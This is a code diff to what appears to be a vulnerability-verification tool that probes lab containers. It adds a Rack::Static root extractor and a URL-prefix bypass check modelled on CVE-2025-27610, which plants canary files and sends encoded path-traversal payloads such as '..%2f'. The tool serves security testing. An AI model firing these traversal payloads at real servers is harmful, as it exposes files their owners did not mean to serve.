@@ -508,12 +508,29 @@ def _scan_web_routes(source_dir: str) -> list:
         # Rack::Static (multi-line): use Rack::Static, ... urls: [...] ...
         # Uses full-file scan because the declaration spans several lines.
         for m_static in re.finditer(
-                r'Rack::Static[^.]*?urls\s*:\s*\[([^\]]+)\]', full_rb, re.DOTALL):
-            urls_str = m_static.group(1)
+                r'Rack::Static([^.]*?)(?=\brun\b|\bend\b|\Z)', full_rb, re.DOTALL):
+            block = m_static.group(0)
+            # Extract urls
+            m_urls = re.search(r'urls\s*:\s*\[([^\]]+)\]', block)
+            if not m_urls:
+                continue
+            # Extract root (optional, used for prefix-bypass canary planting)
+            rack_root = ""
+            m_root = re.search(r'root\s*:\s*["\']([^"\']+)["\']', block)
+            if m_root:
+                rack_root = m_root.group(1)
+            elif re.search(r'root\s*:\s*File\.join\(__dir__\s*,\s*["\']([^"\']+)["\']', block):
+                m_rd = re.search(r'root\s*:\s*File\.join\(__dir__\s*,\s*["\']([^"\']+)["\']', block)
+                if m_rd:
+                    rack_root = "WORKDIR/" + m_rd.group(1)
+            urls_str = m_urls.group(1)
             for pu in re.finditer(r'["\']([^"\']+)["\']', urls_str):
                 prefix = pu.group(1).rstrip("/") + "/"
+                params = {"URL_PATH": ""}
+                if rack_root:
+                    params["RACK_STATIC_ROOT"] = rack_root
                 # URL_PATH mode: traversal payload appended after the prefix
-                routes.append((prefix, {"URL_PATH": ""}, "GET"))
+                routes.append((prefix, params, "GET"))
         for line in lines:
             s = line.strip()
             # get '/path' do ... or post '/path' do ...
@@ -883,6 +900,78 @@ def verify_generic_path_traversal(
             tried_all.extend(tried)
             if found:
                 break
+
+        # --- URL-prefix bypass strategy (Rack::Static / aiohttp static / similar) -----------
+        # Si el path-traversal estandar (canario en /tmp/) no funciono Y estamos en modo
+        # URL_PATH, intentamos el patron de "bypass del prefijo URL": la vulnerabilidad NO
+        # escapa al sistema de ficheros fuera del root del servidor web, sino que permite acceder
+        # a ficheros DENTRO del root que no deberian ser accesibles porque no estan bajo el
+        # prefijo URL configurado (ej. GET /static/..%2fsecret.txt -> sirve root/secret.txt).
+        # CVE-2025-27610 (Rack::Static) usa exactamente este patron.
+        if not found and any(cand_up for _ep, _p, _m, cand_up, _fs in candidates):
+            canary_name = f"binoracle_bypass_{_token()}.txt"
+            # Rutas candidatas dentro del contenedor: comunes para servidores web con Docker
+            root_cands = ["/app/public", "/app/www", "/app/static", "/app",
+                          "/srv/public", "/srv/www", "/var/www/html", "/var/www/public",
+                          "/usr/share/nginx/html", "/usr/share/nginx/www"]
+            # Si el escaner extrajo RACK_STATIC_ROOT, priorizarlo
+            for _ep2, _p2, _m2, _up2, _fs2 in candidates:
+                if isinstance(_p2, dict):
+                    _rsr = _p2.get("RACK_STATIC_ROOT", "")
+                    if _rsr and not _rsr.startswith("WORKDIR/"):
+                        root_cands = [_rsr] + root_cands
+            # Detectar WORKDIR del contenedor para expandir rutas relativas y priorizarlo
+            try:
+                _wd = lab.sh("exec", container, "sh", "-c", "echo $PWD").stdout.strip()
+                if _wd and _wd != "/":
+                    # Sustituir WORKDIR/ en root_cands
+                    root_cands = [rc.replace("WORKDIR/", _wd + "/") for rc in root_cands]
+                    root_cands = [_wd + "/public", _wd + "/www", _wd + "/static", _wd] + root_cands
+            except Exception:
+                pass
+            secret2 = _token() * 4
+            for _root_cand in root_cands:
+                _rc_path = f"{_root_cand}/{canary_name}"
+                if not lab.write_canary(container, _rc_path, secret2):
+                    continue
+                # El prefijo URL es el endpoint de la ruta (ej. '/static/')
+                # Payload: ..%2f<canary> (1 nivel arriba = sale del subdir del prefijo)
+                for cand_ep, _cp, cand_meth, cand_up, _fs in candidates:
+                    if not cand_up:
+                        continue
+                    bypass_payloads = [
+                        f"..%2f{canary_name}", f"%2e%2e%2f{canary_name}",
+                        f".%2e%2f{canary_name}", f"..%2F{canary_name}",
+                        f"../{canary_name}",
+                    ]
+                    for bp in bypass_payloads:
+                        try:
+                            target_url = base_url + cand_ep + bp
+                            resp = _http_request_raw_path(cand_meth, target_url, timeout=15)
+                            present = secret2 in (resp.text or "")
+                            tried_all.append({"payload": f"[bypass]{bp}", "root_cand": _root_cand,
+                                             "status": resp.status_code, "secreto_presente": present,
+                                             "respuesta_cuerpo_recorte": (resp.text or "")[:300]})
+                            if present:
+                                found = True
+                                win_ep, win_up = cand_ep, True
+                                canary_path = _rc_path
+                                secret = secret2
+                                res.evidence["payload_ganador"] = bp
+                                res.evidence["status_code_respuesta"] = resp.status_code
+                                res.evidence["respuesta_cuerpo_recorte"] = (resp.text or "")[:500]
+                                res.evidence["bypass_root_candidate"] = _root_cand
+                                step(f"VERIFICADO (prefix bypass): canario en {_rc_path} accesible "
+                                     f"via URL_PATH={bp!r} -- el middleware sirve ficheros fuera "
+                                     f"del prefijo URL configurado.")
+                                break
+                        except Exception as e:
+                            tried_all.append({"payload": f"[bypass]{bp}", "error": str(e)})
+                    if found:
+                        break
+                if found:
+                    break
+        # --------------------------------------------------------------------------------------
 
         res.evidence.update({"base_url": base_url, "contenedor": container, "endpoint": win_ep,
                              "metodo": (http_method or "GET").upper(), "path_param": win_pp,
